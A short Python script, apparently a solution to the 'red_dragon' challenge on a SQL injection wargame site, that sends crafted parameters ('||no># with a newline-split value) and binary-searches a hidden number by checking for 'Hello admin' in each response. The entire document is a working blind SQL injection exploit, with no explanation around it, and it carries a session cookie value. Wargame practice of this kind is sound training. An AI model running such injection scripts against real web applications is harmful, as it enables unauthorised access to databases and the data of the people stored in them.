import requests

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"
cookie = dict(PHPSESSID="1j4nr4gc2tcc0k9e68hquspdvb")

start = 0
end = 1000000000
mid = (start+end)//2

while(True):
    no = mid
    response = requests.get(url, cookies=cookie, params={"id":"'||no>#", "no":f"\n{no}"})
    print(response.request.url)

    if "Hello admin" in response.text:
        start = mid + 1
        mid = (start+end)//2
    else:
        end = mid - 1
        mid = (start+end)//2
